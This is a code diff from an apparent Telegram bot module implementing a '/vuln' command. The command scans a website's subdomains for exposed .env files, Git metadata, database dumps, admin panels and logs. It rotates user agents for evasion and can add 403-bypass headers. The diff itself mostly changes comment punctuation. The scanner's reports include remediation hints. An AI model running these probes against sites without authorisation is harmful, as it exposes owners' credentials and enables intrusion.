 _COMMON_SUBDOMAINS = [
     "api", "admin", "dev", "staging", "test",
@@ -4027,7 +4109,7 @@ _COMMON_SUBDOMAINS = [
 ]
 
 _VULN_PATHS = [
-    # CRITICAL   Credentials
+    # CRITICAL — Credentials
     ("/.env",                     "🔑 .env file",               "CRITICAL"),
     ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
     ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
@@ -4039,18 +4121,18 @@ _VULN_PATHS = [
     ("/config.json",              "🔑 config.json",             "HIGH"),
     ("/database.yml",             "🔑 database.yml",            "HIGH"),
     ("/settings.py",              "🔑 settings.py",             "HIGH"),
-    # CRITICAL   VCS
+    # CRITICAL — VCS
     ("/.git/config",              "📁 .git/config",             "CRITICAL"),
     ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
     ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
-    # CRITICAL   Backups
+    # CRITICAL — Backups
     ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
     ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
     ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
     ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
     ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
     ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
-    # HIGH   Admin panels
+    # HIGH — Admin panels
     ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
     ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
     ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
@@ -4061,12 +4143,12 @@ _VULN_PATHS = [
     ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
     ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
     ("/login",                    "🔐 Login Page",              "LOW"),
-    # HIGH   Logs
+    # HIGH — Logs
     ("/error.log",                "📋 error.log",               "HIGH"),
     ("/access.log",               "📋 access.log",              "HIGH"),
     ("/debug.log",                "📋 debug.log",               "HIGH"),
     ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
-    # MEDIUM   Server info
+    # MEDIUM — Server info
     ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
     ("/web.config",               "⚙️ web.config",             "HIGH"),
     ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
@@ -4095,9 +4177,9 @@ _FAKE_SIGS = [
     b"does not exist", b"no such file",
 ]
 
-# User-Agents rotation (avoid rate limiting)   60+ UAs for better evasion (updated 2025/2026)
+# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
 _UA_LIST = [
-    # -- Chrome   Windows (latest) ------------------------------------
+    # ── Chrome — Windows (latest) ────────────────────────────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
@@ -4105,27 +4187,27 @@ _UA_LIST = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-    # -- Chrome   Windows (slightly older, still common) --------------
+    # ── Chrome — Windows (slightly older, still common) ──────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
-    # -- Chrome   macOS -----------------------------------------------
+    # ── Chrome — macOS ───────────────────────────────────────────────
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    # -- Chrome   Linux -----------------------------------------------
+    # ── Chrome — Linux ───────────────────────────────────────────────
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    # -- Firefox   Windows --------------------------------------------
+    # ── Firefox — Windows ────────────────────────────────────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
@@ -4136,29 +4218,29 @@ _UA_LIST = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
-    # -- Firefox   macOS ----------------------------------------------
+    # ── Firefox — macOS ──────────────────────────────────────────────
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
-    # -- Firefox   Linux ----------------------------------------------
+    # ── Firefox — Linux ──────────────────────────────────────────────
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
-    # -- Safari   macOS -----------------------------------------------
+    # ── Safari — macOS ───────────────────────────────────────────────
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-    # -- Edge   Windows -----------------------------------------------
+    # ── Edge — Windows ───────────────────────────────────────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
-    # -- Mobile   Android Chrome --------------------------------------
+    # ── Mobile — Android Chrome ──────────────────────────────────────
     'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
@@ -4169,7 +4251,7 @@ _UA_LIST = [
     'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
-    # -- Mobile   iOS Safari ------------------------------------------
+    # ── Mobile — iOS Safari ──────────────────────────────────────────
     'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
@@ -4177,21 +4259,21 @@ _UA_LIST = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-    # -- iPad ---------------------------------------------------------
+    # ── iPad ─────────────────────────────────────────────────────────
     'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
-    # -- Opera ---------------------------------------------------------
+    # ── Opera ─────────────────────────────────────────────────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
-    # -- Brave (Chrome-based) ------------------------------------------
+    # ── Brave (Chrome-based) ──────────────────────────────────────────
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
-    # -- Mobile Firefox -----------------------------------------------
+    # ── Mobile Firefox ───────────────────────────────────────────────
     'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
     'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
     'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
-    # -- Samsung Internet ---------------------------------------------
+    # ── Samsung Internet ─────────────────────────────────────────────
     'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
 ]
@@ -4245,7 +4327,7 @@ def _get_headers(referer: str = None, bypass_403: bool = False) -> dict:
         })
 
     if is_chrome or is_edge:
-        # ✅ Extract ACTUAL version from UA   not hardcoded
+        # ✅ Extract ACTUAL version from UA — not hardcoded
         browser_key = 'Edg/' if is_edge else 'Chrome/'
         ver_m   = re.search(r'Chrome/(\d+)', ua)
         ver_int = int(ver_m.group(1)) if ver_m else 120
@@ -4304,11 +4386,11 @@ def _get_headers(referer: str = None, bypass_403: bool = False) -> dict:
     return hdrs
 
 
-# ==================================================
-# 🔍  SITE PROFILE DETECTOR    Adaptive download
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔍  SITE PROFILE DETECTOR  — Adaptive download
+# ══════════════════════════════════════════════════
 
-_PROFILE_CACHE: dict = {}   # {domain: SiteProfile}   session-level cache (max 100)
+_PROFILE_CACHE: dict = {}   # {domain: SiteProfile} — session-level cache (max 100)
 _PROFILE_CACHE_MAX = 100
 
 def _profile_cache_set(domain: str, profile) -> None:
@@ -4428,7 +4510,7 @@ def detect_site_profile(url: str) -> SiteProfile:
         body = buf.getvalue().decode('utf-8', 'replace').lower()
         hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
 
-        # -- Server / CDN detection -----------------
+        # ── Server / CDN detection ─────────────────
         server = hdrs.get('server', '')
         profile.server = server
 
@@ -4445,7 +4527,7 @@ def detect_site_profile(url: str) -> SiteProfile:
         if 'x-sucuri' in str(hdrs):
             profile.has_waf = True
 
-        # -- CMS / Framework detection --------------
+        # ── CMS / Framework detection ──────────────
         # WordPress
         if ('wp-content/' in body or 'wp-includes/' in body or
                 'wordpress' in body or '/wp-json/' in body):
@@ -4473,7 +4555,7 @@ def detect_site_profile(url: str) -> SiteProfile:
         if not any(s in body for s in dynamic_signals) and not profile.is_spa:
             profile.is_static = True
 
-        # -- robots.txt crawl-delay -----------------
+        # ── robots.txt crawl-delay ─────────────────
         try:
             parsed   = urlparse(url)
             root     = f"{parsed.scheme}://{parsed.netloc}"
@@ -4522,7 +4604,7 @@ def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
 
 def _detect_catchall(base_url: str) -> tuple:
     """
-    Request a random non-existent path   if it returns 200,
+    Request a random non-existent path — if it returns 200,
     the server has a catch-all (Cloudflare, custom 404 as 200).
     Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
     """
@@ -4564,7 +4646,7 @@ def _probe_one(
 
     full_url = base_url.rstrip('/') + path
 
-    # Config/secret file extensions   expect non-HTML content
+    # Config/secret file extensions — expect non-HTML content
     _BINARY_SENSITIVE = frozenset({
         '/.git/config', '/.git/HEAD', '/.env', '/.env.local',
         '/.env.production', '/wp-config.php', '/config.yaml',
@@ -4577,7 +4659,7 @@ def _probe_one(
         resp = requests.get(  # type: ignore[name-defined]
             full_url,
             headers=_get_headers(),  # type: ignore[name-defined]
-            timeout=(5, 8),          # (connect, read)   split for accuracy
+            timeout=(5, 8),          # (connect, read) — split for accuracy
             stream=True,
             allow_redirects=True,
             verify=False,
@@ -4594,11 +4676,11 @@ def _probe_one(
                     break
             resp.close()
 
-            # -- Empty body 200 = false positive ------------------
+            # ── Empty body 200 = false positive ──────────────────
             if not chunk.strip():
                 return None
 
-            # -- Content-Type mismatch filter ---------------------
+            # ── Content-Type mismatch filter ─────────────────────
             # /api/, /.env, /.git/config, etc. returning HTML = custom 404
             if _expect_non_html and ('text/html' in ct or b'<!DOCTYPE' in chunk[:100]):
                 return None
@@ -4607,7 +4689,7 @@ def _probe_one(
                     and len(chunk) > 500):
                 return None
 
-            # -- Catch-all filter ----------------------------------
+            # ── Catch-all filter ──────────────────────────────────
             if catchall:
                 page_hash = hashlib.md5(chunk[:512]).hexdigest()
                 if page_hash == baseline_hash:
@@ -4619,7 +4701,7 @@ def _probe_one(
                     if abs(page_len - baseline_len) < tolerance:
                         return None
 
-            # -- Fake 200 (custom 404) HTML content ---------------
+            # ── Fake 200 (custom 404) HTML content ───────────────
             try:
                 if _is_fake_200_content(chunk, ct):  # type: ignore[name-defined]
                     return None
@@ -4678,7 +4760,7 @@ def _probe_one(
                 pass
 
     except Exception as e:
-        # Timeouts are normal during scans   debug only, not warning
+        # Timeouts are normal during scans — debug only, not warning
         err_name = type(e).__name__
         if 'Timeout' not in err_name:
             logger.debug("_probe_one error [%s] %s: %s", status if 'status' in dir() else '?', path, e)
@@ -4712,7 +4794,7 @@ def _verify_subdomain_real(sub_url: str) -> bool:
 
     # Verify it's NOT a catch-all mirror of the base domain
     is_catchall, _, _ = _detect_catchall(sub_url)
-    # Even catch-all subdomains can be real services   just note it
+    # Even catch-all subdomains can be real services — just note it
     # We still include them but mark behavior
     return True
 
@@ -4759,7 +4841,7 @@ def _scan_target_sync(
 
 def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
     """
-    Discover live subdomains   with real verification (not catch-all mirrors).
+    Discover live subdomains — with real verification (not catch-all mirrors).
     """
     parsed = urlparse(base_url)
     scheme = parsed.scheme
@@ -4821,7 +4903,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
         "error_rate": 0.0,
     }
 
-    # -- SiteProfile ------------------------------------------------
+    # ── SiteProfile ────────────────────────────────────────────────
     domain = urlparse(url).netloc
     try:
         profile = _PROFILE_CACHE.get(domain) or detect_site_profile(url)  # type: ignore[name-defined]
@@ -4833,7 +4915,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
     has_waf       = getattr(profile, 'has_waf', False)
     results["cloudflare"] = is_cloudflare
 
-    # -- Adaptive scan settings -------------------------------------
+    # ── Adaptive scan settings ─────────────────────────────────────
     if is_cloudflare or has_waf:
         req_delay, sub_workers, vuln_workers = 0.8, 4, 4
     elif getattr(profile, 'is_shopify', False) or getattr(profile, 'is_wordpress', False):
@@ -4841,7 +4923,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
     else:
         req_delay, sub_workers, vuln_workers = 0.2, 10, 8
 
-    # -- Build profile-specific extra vuln paths --------------------
+    # ── Build profile-specific extra vuln paths ────────────────────
     extra_paths = []
     if getattr(profile, 'is_wordpress', False):
         extra_paths += [
@@ -4868,7 +4950,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
             ("/static/js/main.chunk.js",  "📦 React main bundle","INFO"),
         ]
 
-    # -- Deduplicate paths (path key only, keep first occurrence) ----
+    # ── Deduplicate paths (path key only, keep first occurrence) ────
     try:
         base_paths = list(_VULN_PATHS)   # type: ignore[name-defined]
     except NameError:
@@ -4880,7 +4962,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
             seen_paths[p] = entry
     all_vuln_paths = list(seen_paths.values())
 
-    # -- Baseline headers -------------------------------------------
+    # ── Baseline headers ───────────────────────────────────────────
     progress_q.append(
         f"🔍 Security headers...\n"
         f"📋 Profile: *{results['profile']}* | "
@@ -4902,12 +4984,12 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
             if hdr.lower() not in hdrs:
                 results["missing_headers"].append((name, hdr, sev))
 
-        # Server version disclosure   only if version digits present
+        # Server version disclosure — only if version digits present
         if srv and srv != 'Unknown' and any(c.isdigit() for c in srv):
             results["missing_headers"].append(
                 ("Server version leak", f"Server: {srv[:50]}", "LOW"))
 
-        # X-Powered-By   only report if contains version info
+        # X-Powered-By — only report if contains version info
         xpb = r0.headers.get('X-Powered-By', '')
         if xpb and any(c.isdigit() for c in xpb):
             results["missing_headers"].append(
@@ -4929,7 +5011,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
             "Slower scan mode activated..."
         )
 
-    # -- Subdomain discovery ----------------------------------------
+    # ── Subdomain discovery ────────────────────────────────────────
     try:
         live_subs = _discover_subdomains_sync(url, progress_q)  # type: ignore[name-defined]
     except Exception as e:
@@ -4945,7 +5027,7 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
     else:
         progress_q.append("📭 No live subdomains found")
 
-    # -- Scan each target --------------------------------------------
+    # ── Scan each target ────────────────────────────────────────────
     all_targets = [url] + live_subs
     total_probes = 0
     total_errors = 0
@@ -5001,14 +5083,14 @@ def _format_vuln_report(r: dict) -> str:
     domain = urlparse(r["url"]).netloc
     lines  = []
 
-    # -- Flatten all exposed findings -----------------------------
+    # ── Flatten all exposed findings ─────────────────────────────
     all_exposed: list = []
     for f in r.get("findings", []):
         for fi in f.get("exposed", []):
             fi["_netloc"] = f["netloc"]
             all_exposed.append(fi)
 
-    # -- Overall risk ----------------------------------------------
+    # ── Overall risk ──────────────────────────────────────────────
     all_sevs = [fi["severity"] for fi in all_exposed]
 
     try:
@@ -5032,7 +5114,7 @@ def _format_vuln_report(r: dict) -> str:
 
     cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
 
-    # -- Header ----------------------------------------------------
+    # ── Header ────────────────────────────────────────────────────
     lines += [
         "🛡️ *Vulnerability Scan Report*",
         f"🌐 `{domain}`{cf_badge}",
@@ -5043,7 +5125,7 @@ def _format_vuln_report(r: dict) -> str:
         "",
     ]
 
-    # -- Executive Summary (severity count table) ------------------
+    # ── Executive Summary (severity count table) ──────────────────
     from collections import Counter
     sev_counts = Counter(fi["severity"] for fi in all_exposed)
     if sev_counts:
@@ -5055,20 +5137,20 @@ def _format_vuln_report(r: dict) -> str:
                 lines.append(f"  {em} `{sev}`: `{count}` finding(s)")
         lines.append("")
 
-    # -- HTTPS -----------------------------------------------------
+    # ── HTTPS ─────────────────────────────────────────────────────
     lines.append("*🔐 HTTPS:*")
     lines.append("  ✅ HTTPS enabled" if r.get("https") else
-                 "  🔴 HTTP only   no encryption!")
+                 "  🔴 HTTP only — no encryption!")
     lines.append("")
 
-    # -- Subdomains ------------------------------------------------
+    # ── Subdomains ────────────────────────────────────────────────
     if r.get("subdomains_found"):
         lines.append("*📡 Live Subdomains:*")
         for s in r["subdomains_found"]:
             lines.append(f"  • `{urlparse(s).netloc}`")
         lines.append("")
 
-    # -- Remediation hints per severity ---------------------------
+    # ── Remediation hints per severity ───────────────────────────
     _REMEDIATION_HINTS = {
         "CRITICAL": "🔧 _Immediately restrict access & rotate credentials_",
         "HIGH":     "🔧 _Restrict access via server config or .htaccess_",
@@ -5077,7 +5159,7 @@ def _format_vuln_report(r: dict) -> str:
         "INFO":     "",
     }
 
-    # -- Findings grouped by severity -----------------------------
+    # ── Findings grouped by severity ─────────────────────────────
     if all_exposed:
         lines.append("*🚨 Findings by Severity:*")
         lines.append("")
@@ -5087,7 +5169,7 @@ def _format_vuln_report(r: dict) -> str:
                 continue
             em = sev_emoji.get(sev_level, "⚪")
             lines.append(f"{em} *{sev_level}* ({len(level_findings)})")
-            lines.append("-" * 20)
+            lines.append("─" * 20)
             for fi in level_findings:
                 netloc_note = (f" _(on `{fi['_netloc']}`)"
                                if fi.get("_netloc") and fi["_netloc"] != domain
@@ -5105,7 +5187,7 @@ def _format_vuln_report(r: dict) -> str:
     else:
         lines += ["*✅ No exposed files found*", ""]
 
-    # -- Protected (403) findings   compact section -----------------
+    # ── Protected (403) findings — compact section ─────────────────
     all_protected = []
     for f in r.get("findings", []):
         for fi in f.get("protected", []):
@@ -5122,16 +5204,16 @@ def _format_vuln_report(r: dict) -> str:
             lines.append(f"  _…and {len(all_protected) - 8} more_")
         lines.append("")
 
-    # -- Clickjacking ----------------------------------------------
+    # ── Clickjacking ──────────────────────────────────────────────
     lines.append("*🖼️ Clickjacking:*")
     if r.get("clickjacking"):
-        lines.append("  🟠 Vulnerable   no X-Frame-Options / frame-ancestors CSP")
+        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors CSP")
         lines.append("  🔧 Fix: Add `X-Frame-Options: SAMEORIGIN`")
     else:
         lines.append("  ✅ Protected")
     lines.append("")
 
-    # -- Missing Security Headers ----------------------------------
+    # ── Missing Security Headers ──────────────────────────────────
     if r.get("missing_headers"):
         lines.append("*📋 Security Header Issues:*")
         # Group by severity
@@ -5152,7 +5234,7 @@ def _format_vuln_report(r: dict) -> str:
                 lines.append(f"    `{hdr}`")
         lines.append("")
 
-    # -- Cloudflare note -------------------------------------------
+    # ── Cloudflare note ───────────────────────────────────────────
     if r.get("cloudflare"):
         lines += [
             "☁️ *Cloudflare note:*",
@@ -5161,7 +5243,7 @@ def _format_vuln_report(r: dict) -> str:
             "",
         ]
 
-    # -- Scan quality warning --------------------------------------
+    # ── Scan quality warning ──────────────────────────────────────
     error_rate = r.get("error_rate", 0.0)
     if error_rate > 0.15:
         lines += [
@@ -5171,16 +5253,16 @@ def _format_vuln_report(r: dict) -> str:
         ]
 
     lines += [
-        "------------------",
-        "⚠️ _Passive scan only   no exploitation_",
+        "━━━━━━━━━━━━━━━━━━",
+        "⚠️ _Passive scan only — no exploitation_",
     ]
     return "\n".join(lines)
 
 
-# ==================================================
-# 🛡️  SECURITY GUARD   စစ်ဆေးချက် ၃ ခုလုံး တစ်ခါတည်း
+# ══════════════════════════════════════════════════
+# 🛡️  SECURITY GUARD — စစ်ဆေးချက် ၃ ခုလုံး တစ်ခါတည်း
 #     rate_limit + is_safe_url + url normalise
-# ==================================================
+# ══════════════════════════════════════════════════
 async def _security_guard(update, context, heavy: bool = True):
     """
     Command မှန်သမျှ အစပိုင်းမှာ ခေါ်ပါ။
@@ -5206,7 +5288,7 @@ async def _security_guard(update, context, heavy: bool = True):
     return True, url
 
 async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/vuln <url> - Passive vuln scanner with CF-aware subdomain discovery."""
+    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
     if not context.args:
         await update.effective_message.reply_text(
             "🛡️ *Vulnerability Scanner v4*\n\n"
@@ -5219,7 +5301,7 @@ async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• 📁 Git / backup / DB dumps\n"
             "• 🔐 Admin panel detection\n"
             "• 🔗 Full clickable URLs\n\n"
-            "_Passive only   no exploitation_",
+            "_Passive only — no exploitation_",
             parse_mode='Markdown'
         )
         return
@@ -5235,7 +5317,7 @@ async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Vuln scan")
@@ -5305,17 +5387,17 @@ async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
